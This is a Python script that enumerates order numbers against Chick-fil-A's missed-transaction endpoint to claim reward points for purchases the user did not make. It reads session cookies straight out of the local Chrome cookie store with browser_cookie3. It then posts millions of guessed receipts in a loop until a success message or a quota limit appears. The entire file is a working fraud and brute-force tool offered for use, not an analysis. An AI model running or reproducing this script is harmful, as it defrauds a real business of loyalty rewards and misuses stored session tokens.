import browser_cookie3
import requests
from bs4 import BeautifulSoup

DATE = '06/14/2021'
ORDER_NUMBER = 1375222
RESTAURANT_NUMBER = '04161'
MATCHES = 0

cookie_jar = browser_cookie3.chrome(domain_name='.chick-fil-a.com')
cookies = {'.AspNet.Cookies': cookie_jar._cookies['.chick-fil-a.com']['/']['.AspNet.Cookies'].value,
           'Crn.TokenInformation': cookie_jar._cookies['.chick-fil-a.com']['/']['Crn.TokenInformation'].value}
# cookies = {
#     '.AspNet.Cookies': '',
#     'Crn.TokenInformation': ''}

while ORDER_NUMBER < 9999999:
    print(ORDER_NUMBER)
    data = {'RestaurantNumber': RESTAURANT_NUMBER,
            'Date': DATE,
            'OrderNumber': ORDER_NUMBER,
            'OrderTotal': 15.00}
    ORDER_NUMBER += 1
    r = requests.post(
        'https://www.chick-fil-a.com/missedtransaction', data=data, cookies=cookies)
    # with open("debug.html", "w") as f:
    #     f.write(r.text)
    html = BeautifulSoup(r.text, 'html.parser')
    if html.find_all('h3', string='Success!'):
        print('MATCH FOUND, FREE POINTS!')
        MATCHES += 1
    elif 'missed' in html.find_all('p', attrs={'role': 'alert'})[0].text:
        print('QUOTA REACHED')
        print(f'MATCHES : {MATCHES}')
        break
    else:
        print('NO MATCH FOUND')
